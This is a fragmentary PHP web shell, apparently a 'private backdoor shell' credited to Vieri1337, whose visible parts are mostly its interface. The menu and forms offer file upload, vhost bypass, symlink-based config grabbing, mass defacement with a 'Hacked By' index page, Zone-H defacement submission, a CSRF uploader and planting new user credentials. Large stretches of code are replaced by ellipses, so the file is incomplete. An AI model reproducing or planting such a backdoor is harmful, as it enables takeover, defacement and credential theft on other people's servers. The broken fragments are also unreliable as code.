<?php
// Powered By Vieri1337 //
// Private Backdors Shell 2020//
 ...
 echo "<script>window.location='?ver'</script>";
 }
 if($_GET['page'] == "blank") {
 echo "<a href='?'>Back</a>";
 exit();
 ...
 session_destroy();
 echo "<script>window.location='?1337'</script>";
 }
 if(!($_SESSION['forbidden'])) {
 ?>
 <title> -=[ Priv8 Vieri 1337 ]=- </title>
 ...
 <body bgcolor="black">
 <center><img src="https://e.top4top.io/p_2049hf4ll0.png" style="opacity:1; width:300px; height:300px";></center>
 <center><h1><center><font color="red" face="Patrick Hand">XxX </font><font color="white" face="Patrick Hand">Priv8 Shell</font><font color="Red" face="Patrick Hand"> XxX</font><br>
 </center>
...
<title>-=[ Priv8 Vieri 1337 ]=-</title>
<meta property="og:image" https://e.top4top.io/p_2049hf4ll0.png">
<style>
body{
...
.destroy_table {;
  ...
  background-color: #000000;
            background-image: url(https://j.top4top.io/p_1630nrgi67.jpeg);
...
<center>
<br>
<font face="Kelly Slab" color="white" size="7px">-=[ Priv8_Shell_1337 ]=-</font><br>
</h1></center>
<table width="100%" border="0" cellpadding="0" cellspacing="0" align="left">
<tr><td>';
echo "<tr><td><font color='white'>
+ IP Kamu    <td>: <font color='lime'>".$_SERVER['REMOTE_ADDR']."<tr><td><font color='white'>
...
+ Powered By   <td>: <font color='lime'>Vieri1337<tr><td><font color='white'>
+ Supported by  <td>: <font color='lime'> Priv8 Bot Gank // PT. Bot Jaya Abadi</font></tr></td><br>
</table>";
...
echo '<font color="yellow">UPLOADED SUCCESS !!!!!</script><br/>';
}else{
...
echo "<a class='destroy_table' href='?dir=$dir&to=vhost'>Bypas-vhost</a>";
echo "<a class='destroy_table' href='?dir=$dir&to=hashid'>Hash-Id</a>";
echo "<a class='destroy_table' href='?dir=$dir&to=domains'>Domain-Views</a>";
echo "<a class='destroy_table' href='?dir=$dir&to=disablefunc'>Disable-Functions</a>";
echo "<a class='destroy_table' href='?dir=$dir&to=defid'>Defacer-Id</a>";
echo "<a class='destroy_table' href='?dir=$dir&to=symconfig'>Sym-Config</a>";
echo "<a class='destroy_table' href='?dir=$dir&to=csrfup'>Csrf</a><br>";
echo "<a class='destroy_table' href='?dir=$dir&to=config'>Config-grab</a>";
...
if($_GET['to'] == 'zoneh') {
	if($_POST['submit']) {
		...
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='Haxor1337'><br>
		<u>Domains</u>: <br>
...
echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='hekel' size='50' value='Haxor1337'><br>
		<u>Team</u>: <br>
...
<p><input name=\"m\" size=\"80\" value=\"Start\" type=\"submit\"/></p>
	...
	<input type='text' name='d_file' value='id.html' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Index File:</font><br>
	<textarea name='script' style='width: 450px; height: 200px;'>Hacked By Vieri1337</textarea><br>
	...
	{	
	echo '<html>
	<center><h1 style="font-size:33px;">CSRF Exploiter By Priv8 Bot Gank<br>Powered By Vieri1337</h1><br><br>
...
echo "</div>";
 ...
 Set User & Pass: <br>
 <input type='text' name='user_baru' value='Haxor1337' placeholder='user_baru'><br>
 <input type='text' name='pass_baru' value='Haxor1337' placeholder='pass_baru'><br>
 ...
 echo 'Sha1 with Salt & MD5: <input class=inputz type=text size=50 value='.$hash1_sha1_double.'></center></table>';
   ...
   <td>
   <center>
   <h2 style='color'blue'>Priv8 Shell 1337</font></h2>
   <p style='color: white;'>Supported By:</p>
   <font color="cyan">[</font>
   <marquee behavior="scroll" scrollamount="10" style="width: 40%;">Priv8 Bot Gank - PT. Bot Jaya Abadi - PT. Manuntung </marquee>
   <font color="cyan">]</font>
   <p>Author Kek Babi:v</p>
   </center>
   </td>
   </tr>
   <?php
...
echo '<center><br/><font face="Kelly Slab" color="white" style="text-shadow:0 0 20px gold, 0 0 5px gold, 0 0 7px red, 0 0 45px gold; font-weight:bold: white; font-size:15px">Copyright &copy;2020 Vieri1337 |  Allright Reserved</center>
</body>
</html>';
function perms($file){
